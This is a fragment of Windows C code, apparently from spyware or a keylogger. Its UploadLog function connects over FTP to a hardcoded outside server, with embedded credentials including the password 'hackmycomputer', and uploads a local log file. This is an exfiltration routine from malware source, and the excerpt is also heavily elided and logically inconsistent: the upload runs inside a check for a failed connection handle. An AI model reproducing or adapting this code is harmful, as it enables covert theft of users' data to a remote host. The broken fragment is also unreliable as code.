...
inline char UploadLog(unsigned long int no)
{
	...
	if(Connection_Available)
	{
		...
		HINTERNET hFtp = InternetConnect(hNet,"www.interlink.150m.com",
			INTERNET_DEFAULT_FTP_PORT ,"interlink.150m.com","hackmycomputer",
		...
		if(hNet == NULL) {
			...
			if(FtpPutFile(hFtp, local_file, remote_file, 0, 0)) {
				/* file transfer OK */
				MessageBox(NULL,local_file,"OK",0);
				InternetCloseHandle(hNet);
				...
				MessageBox(NULL,local_file,"failed",0);
				InternetCloseHandle(hNet);
				InternetCloseHandle(hFtp);
				semaphore = FALSE;
				return 0;
